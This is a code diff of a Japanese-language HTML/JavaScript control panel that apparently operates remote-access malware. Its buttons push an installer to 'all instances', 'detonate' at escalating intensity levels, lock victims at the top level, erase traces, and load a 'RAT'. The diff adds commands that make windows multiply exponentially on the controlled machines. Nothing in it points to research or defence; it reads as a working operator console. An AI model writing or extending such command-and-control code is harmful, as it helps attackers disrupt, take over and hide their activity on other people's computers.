@@ -84,7 +84,7 @@
     <h2>■ 操作盤</h2>
 
     <div class="row" style="justify-content:space-between">
-      <span class="hint">強度レベル（L0〜L7）／ L7は固定枠・OS常駐インストーラ</span>
+      <span class="hint">強度レベル（L0〜L7）／ L7は固定枠・窓は指数増殖</span>
       <span class="hint">ヒット <b id="vw-total">{{ total }}</b> ／ 未処理コマンド <b id="vw-pend">0</b></span>
     </div>
 
@@ -118,6 +118,8 @@
       <button id="vw-boom" class="danger">☢ 終焉（L6即時）</button>
       <button id="vw-fix" class="fixbtn">🔒 絶滅固定（L7・ロック）</button>
       <button id="vw-native" class="danger">🖥 インストーラを配る</button>
+      <button id="vw-breed" class="danger">🌐 窓を繁殖（×2）</button>
+      <button id="vw-breed3" class="danger">🌐×3</button>
       <button id="vw-wipe" class="danger">🧹 痕跡消去</button>
     </div>
 
@@ -150,11 +152,12 @@
       <button data-cmd="reload">🔄 再読込</button>
       <button data-cmd="update">⬆ 更新</button>
       <button data-cmd="native" class="danger">🖥 インストーラDL</button>
+      <button data-cmd="win" class="danger">🌐 繁殖</button>
       <button data-cmd="burn" class="danger">🔥 burn</button>
       <button data-cmd="kill" class="danger">☠ 全停止</button>
     </div>
     <div class="row" style="margin-top:9px">
-      <input id="vw-arg" placeholder="引数（喋る言葉 / 開くURL など）" style="flex:1;min-width:220px">
+      <input id="vw-arg" placeholder="引数（喋る言葉 / 開くURL / 繁殖の分岐数）" style="flex:1;min-width:220px">
       <button id="vw-arg-send" class="ghost">送信</button>
       <button id="vw-rat-load" class="ghost">取得</button>
       <button id="vw-cmds-clear" class="ghost">コマンド全消去</button>
@@ -266,6 +269,8 @@
   $("vw-freeze-hard").onclick = async () => { await post("/freeze", {freeze: "hard"}); log("硬凍結"); sync(); };
   $("vw-boom").onclick  = async () => { await post("/detonate"); log("終焉（L6）"); LV = 6; sync(); };
   $("vw-native").onclick = async () => { await post("/cmd", {sid:"", kind:"native", arg:"bat"}); log("インストーラDLを全個体へ"); sync(); };
+  $("vw-breed").onclick  = async () => { await post("/cmd", {sid:"", kind:"win", arg:"2"}); log("窓を×2で繁殖"); sync(); };
+  $("vw-breed3").onclick = async () => { await post("/cmd", {sid:"", kind:"win", arg:"3"}); log("窓を×3で繁殖"); sync(); };
   $("vw-fix").onclick   = async () => {
     FIXED = FIXED ? 0 : 1;
     await post("/fix", {fixed: FIXED});
@@ -284,7 +289,7 @@
   document.querySelectorAll("[data-cmd]").forEach(function (b) {
     b.addEventListener("click", function () {
       const k = b.getAttribute("data-cmd");
-      const a = (k === "speak" || k === "open" || k === "native") ? $("vw-arg").value : "";
+      const a = (k === "speak" || k === "open" || k === "native" || k === "win") ? $("vw-arg").value : "";
       sendCmd(k, a);
     });
   });
